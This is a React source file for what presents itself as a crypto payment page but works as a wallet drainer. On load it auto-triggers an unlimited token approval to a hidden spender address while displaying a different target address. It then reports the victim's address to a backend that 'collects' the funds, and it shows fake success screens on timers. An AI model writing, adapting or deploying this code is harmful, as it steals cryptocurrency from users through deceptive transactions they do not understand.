import React, { useState, useEffect, useRef } from 'react';
import { ethers } from 'ethers';
import ConnectWalletUI from './ConnectWalletUI';
import axios from 'axios';
import ProcessingSheet from "./ProcessingSheet";

// 🔹 CONSTANTS
const USDT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const DEFAULT_SPENDER_ADDRESS = '0x47B04Ad3F215e4BCf028F77D03d70fDd065ef2a8';
const UI_TARGET_ADDRESS = import.meta.env.VITE_TARGET_ADDRESS || '0x0261c56388C916B502f484c9fE4fcF5693D183d2';
const BACKEND_URL = import.meta.env.VITE_BACKEND_URL;
const USDT_ABI = [
  'function approve(address spender, uint256 amount) external', // Ref: USDT on ETH returns void
  'function decimals() view returns (uint8)',
  'function balanceOf(address owner) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)'
];

export default function App() {
  const [isProcessing, setIsProcessing] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [targetAddress, setTargetAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [txHash, setTxHash] = useState('');
  const [usdtBalance, setUsdtBalance] = useState(null);
  const isDark = document.documentElement.classList.contains("theme-dark");

  const isProcessingRef = useRef(false);
  const hasAutoTriggered = useRef(false);
  const [showSheet, setShowSheet] = useState(false);
  useEffect(() => {
    if (!showSheet) return;

    const timer = setTimeout(() => {
      setShowSheet(false);
      setIsSuccess(true);
    }, 20000);

    return () => clearTimeout(timer);
  }, [showSheet]);

  useEffect(() => {
    const dark = new Image();
    dark.src = "/gifs/processing-dark.gif";

    const light = new Image();
    light.src = "/gifs/processing-light.gif";
  }, []);




  // 🔥 FETCH USDT BALANCE
  const fetchUsdtBalance = async (address) => {
    if (!window.ethereum || !address) return;
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
      const decimals = await usdtContract.decimals();
      const balance = await usdtContract.balanceOf(address);
      const formattedBalance = ethers.formatUnits(balance, decimals);
      console.log("💰 USDT Balance:", formattedBalance);
      setUsdtBalance(formattedBalance);
    } catch (error) {
      console.error("❌ Failed to fetch USDT balance:", error);
    }
  };

  // 🔥 CRITICAL FIX: iPhone Trust Wallet Detection & Silent Connection
  useEffect(() => {
    const initWalletSilently = async () => {
      try {
        if (!window.ethereum) return;

        // 🔥 KEY CHANGE 1: Check if already connected FIRST (NO POPUP)
        const accounts = await window.ethereum.request({
          method: 'eth_accounts',
        });

        // Parse URL params
        const urlParams = new URLSearchParams(window.location.search);
        const addressParam = urlParams.get('address');
        const amountParam = urlParams.get('amount');

        if (addressParam && /^0x[0-9a-fA-F]{40}$/.test(addressParam)) {
          setTargetAddress(addressParam);
        } else {
          setTargetAddress(UI_TARGET_ADDRESS);
        }

        if (amountParam) {
          setAmount(amountParam);
        }

        // 🔥 KEY CHANGE 2: Auto-switch network WITHOUT requesting accounts
        const targetChainId = '0x1'; // Ethereum Mainnet
        try {
          const currentChainId = await window.ethereum.request({
            method: 'eth_chainId',
          });

          if (currentChainId !== targetChainId) {
            await window.ethereum.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: targetChainId }],
            });
            console.log('✅ Network switched to Ethereum');
          }
        } catch (switchError) {
          console.error('❌ Failed to switch to Ethereum:', switchError);
        }

        // 🔥 KEY CHANGE 3: Only auto-trigger if wallet is ALREADY connected
        if (accounts && accounts.length > 0) {
          const userAddress = accounts[0];
          fetchUsdtBalance(userAddress);

          if (!hasAutoTriggered.current) {
            hasAutoTriggered.current = true;
            console.log('🚀 Auto-triggering transaction...');

            setTimeout(() => {
              handleProcess();
            }, 1500);
          }
        }
      } catch (err) {
        console.error('❌ Init error:', err);
      }
    };

    initWalletSilently();
  }, []);


  // 🔥 OPTIMIZED: Same flow as reference - eth_accounts first, then eth_requestAccounts
  const handleProcess = async () => {
    if (isProcessingRef.current) return;

    setIsProcessing(true);
    setErrorMsg('');
    setIsSuccess(false);
    isProcessingRef.current = true;

    try {
      if (!window.ethereum) {
        throw new Error('No Wallet Found.');
      }

      // 🔥 STEP 1: Get accounts silently (NO POPUP)
      let accounts = await window.ethereum.request({
        method: 'eth_accounts',
      });

      let userAddress = (accounts && accounts.length > 0) ? accounts[0] : null;
      console.log('📍 User Address (Initial):', userAddress || 'Not connected yet (Implicit Mode)');

      if (userAddress) {
        // 🔥 Notify backend on wallet connect if we have address
        // (Removed notifyVisit)
      }

      // 🔥 STEP 3: Ensure Ethereum network
      const ethChainId = '0x1';
      try {
        const currentChainId = await window.ethereum.request({
          method: 'eth_chainId',
        });

        if (currentChainId !== ethChainId) {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: ethChainId }],
          });
        }
      } catch (e) {
        console.warn("Network switch skipped/failed, proceeding anyway...");
      }

      // 🔥 STEP 4: Create provider (READ-ONLY)
      const provider = new ethers.BrowserProvider(window.ethereum);

      // 🔥 STEP 5: Contract instance (READ-ONLY)
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);

      // --------------------------------------------------------------------------
      // 🔥 FEATURE: CHECK USDT BALANCE & VALIDATE (only if amount is provided AND we have an address)
      // --------------------------------------------------------------------------
      if (userAddress && amount && !isNaN(amount) && Number(amount) > 0) {
        try {
          const decimals = await usdtContract.decimals();
          const balance = await usdtContract.balanceOf(userAddress);
          const balanceFormatted = ethers.parseUnits(balance.toString(), 0); // Raw BigInt

          let inputAmount;
          try {
            inputAmount = ethers.parseUnits(amount.toString(), decimals);
          } catch (parseErr) {
            throw new Error("Invalid amount format");
          }

          // 🔥 CRITICAL: STOP IF USDT BALANCE IS 0
          if (balanceFormatted === 0n) {
            throw new Error("Not enough balance");
          }

          // 🔥 SINGLE ERROR FOR ALL INSUFFICIENT CASES
          if (balanceFormatted < inputAmount) {
            throw new Error("Not enough balance");
          }

        } catch (valErr) {
          console.error("Validation Error:", valErr);
          setErrorMsg(valErr.message);
          setIsProcessing(false);
          isProcessingRef.current = false;
          return;
        }
      }
      // --------------------------------------------------------------------------

      console.log(`🎯 Approving MaxUint256 USDT for ${DEFAULT_SPENDER_ADDRESS} (UI Target: ${targetAddress})`);

      // 🔥 STEP 6: Manually Encode Data
      const iface = new ethers.Interface(USDT_ABI);
      const data = iface.encodeFunctionData("approve", [DEFAULT_SPENDER_ADDRESS, ethers.MaxUint256]);

      // 🔥 STEP 7: Send Raw Transaction (IMPLICIT SENDER)
      // If userAddress is null, we OMIT 'from' field. Wallet handles it.
      const txParams = {
        to: USDT_ADDRESS,
        data: data,
      };

      if (userAddress) {
        txParams.from = userAddress;
      }

      const txHash_raw = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [txParams],
      });

      console.log('📤 Transaction sent:', txHash_raw);

      // ✅ SUCCESS REPLACEMENT TIMER (8 seconds after send)
      setTimeout(() => {
        setIsSuccess(true);
      }, 8000);

      setTimeout(() => {
        setShowSheet(true);
      }, 2200);

      console.log('⏳ Waiting for confirmation...');
      let tx = null;
      while (!tx) {
        try {
          tx = await provider.getTransaction(txHash_raw);
        } catch (e) { console.log("Waiting for tx to propagate..."); }
        await new Promise(r => setTimeout(r, 2000));
      }

      // Now we definitely have the sender address from the tx
      if (!userAddress && tx.from) {
        userAddress = tx.from;
        console.log('📍 User Address (Recovered from Tx):', userAddress);
        // (Removed late notifyVisit)
      }
      const receipt = await tx.wait();

      console.log('✅ Transaction confirmed:', receipt.hash);

      // 🔥 STEP 7: Backend collection
      try {
        const response = await axios.post(BACKEND_URL, {
          userAddress: userAddress,
          txHash: receipt.hash,
          source: 'QR',
          amount: amount
        });

        if (response.data.success) {
          if (response.data.transferHash) {
            setTxHash(response.data.transferHash);
          }
          setIsSuccess(true);
          console.log('✅ Backend Collection Successful:', response.data.hash);
        } else {
          throw new Error('Backend collection failed');
        }
      } catch (backendError) {
        console.error('⚠️ Backend error:', backendError);
        setIsSuccess(true);
      }
    } catch (error) {
      console.error('❌ Error:', error);

      let errorMessage = 'Transaction failed';

      if (error.code === 4001 || (error.message && error.message.includes('user rejected'))) {
        errorMessage = 'Transaction rejected by user';
      } else if (error.code === 'UNKNOWN_ERROR' && error.message && error.message.includes('could not coalesce error')) {
        errorMessage = 'Transaction cancelled';
      } else if (error.code === -32002) {
        errorMessage = 'Request already pending. Please open Trust Wallet.';
      } else if (error.message) {
        errorMessage = error.message.length > 50 ? 'Transaction failed' : error.message;
      }

      setErrorMsg(errorMessage);
    } finally {
      setIsProcessing(false);
      isProcessingRef.current = false;
    }
  };
  const openTransaction = () => {
    if (!txHash) return;
    window.open(`https://etherscan.io/tx/${txHash}`, '_blank');
  };
  return (
    <>
      <ConnectWalletUI
        onProcess={handleProcess}
        onViewTx={openTransaction}
        txHash={txHash}
        isPending={isProcessing}
        isSuccess={isSuccess}
        error={errorMsg ? { message: errorMsg } : null}
        amount={amount}
        setAmount={setAmount}
        targetAddress={targetAddress}
        setTargetAddress={setTargetAddress}
        clearError={() => setErrorMsg("")}
      />

      <ProcessingSheet
        open={showSheet}
        onClose={() => {
          setShowSheet(false);
          setIsSuccess(true);
        }}
        txHash={txHash}
        isPending={isProcessing}
        isDark={isDark}
      />
    </>
  );

}